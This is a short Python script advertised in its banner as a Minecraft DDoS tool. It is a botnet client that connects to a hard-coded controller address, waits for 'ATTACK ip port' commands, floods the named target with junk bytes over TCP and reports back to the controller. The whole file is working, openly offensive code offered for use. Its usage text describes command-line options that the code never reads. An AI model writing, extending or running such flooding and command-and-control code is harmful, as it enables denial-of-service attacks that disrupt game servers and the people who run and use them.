import socket
import threading
from colorama import init, Fore

init()

print(Fore.RED + """
  /\\_/\\
 ( o.o )
  > ^ <

Hacking The DDoS Minecraft Soon By Angel
Github: Angel + Make Angel Dev Soon
How to use ddos Minecraft Use -ip ip Server -p Port Server
""")

def client_handler(server_ip, server_port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            print("Connected to the server.")
            while True:
                data = s.recv(1024).decode('utf-8')
                if data.startswith("ATTACK"):
                    _, ip, port = data.split()
                    print(f"Attacking {ip}:{port}")
                    send_request(ip, int(port))
                    # تأكيد الهجوم
                    s.sendall(f"ACK {ip} {port}".encode('utf-8'))

    except Exception as e:
        print(f"An error occurred: {e}")

def send_request(ip, port, count=1000, delay=0):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            for _ in range(count):
                s.sendall(b'\xFF\xFF\xFF\xFF')
    except Exception as e:
        print(f"An error occurred during the attack: {e}")

if __name__ == "__main__":
    server_ip = "192.168.0.101"  # استخدم IP الخادم هنا
    server_port = 8080  # استخدم نفس المنفذ الذي تم تحديده في الخادم
    client_handler(server_ip, server_port)